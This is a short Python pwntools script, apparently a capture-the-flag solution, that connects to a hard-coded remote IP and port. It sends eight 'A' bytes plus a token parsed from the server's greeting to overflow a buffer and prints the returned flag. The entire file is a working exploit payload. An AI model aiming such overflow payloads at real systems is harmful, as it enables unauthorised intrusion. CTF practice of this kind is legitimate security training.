from pwn import *

# nc 13.214.30.13 10001
HOST = "13.214.30.13"
PORT = "10001"

buffsize = 8

p = remote(HOST, PORT)
text = p.recvline()
text = text.decode()
arr = text.split(" ")

payload = 'A' *buffsize + arr[5]
payload = payload.encode()
p.sendline(payload)
print(p.recvuntil(b"\n"))
print(p.recvuntil(b"\n"))

flag = p.recvline().decode()
p.close()
print(flag)